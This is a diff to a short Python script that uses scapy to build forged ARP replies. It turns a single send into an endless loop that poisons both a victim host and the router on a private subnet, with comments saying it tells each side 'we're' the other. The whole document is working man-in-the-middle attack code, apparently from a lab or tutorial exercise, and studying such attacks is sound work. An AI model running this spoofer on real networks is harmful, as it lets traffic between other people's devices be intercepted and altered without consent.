@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-
+import time
 import scapy.all as scapy
 
 
@@ -21,9 +21,11 @@ def spoof(target_ip, spoof_ip):
     # psrc -> ip to simulate
     # For more info print(packet.show())
     # For more info print(packet.summary())
-    return scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip),
-                       psrc=spoof_ip)  # , hwsrc="08:00:00:00:00:3c")
+    return scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)  # , hwsrc="08:00:00:00:00:3c")
 
 
-scapy.send(spoof("192.168.180.9", "192.168.180.100"))
+while True:
+    scapy.send(spoof("192.168.180.9", "192.168.180.100"))  # telling the victim we're the router
+    scapy.send(spoof("192.168.180.100", "192.168.180.9"))  # telling the router we're the victim
+    time.sleep(2)
 
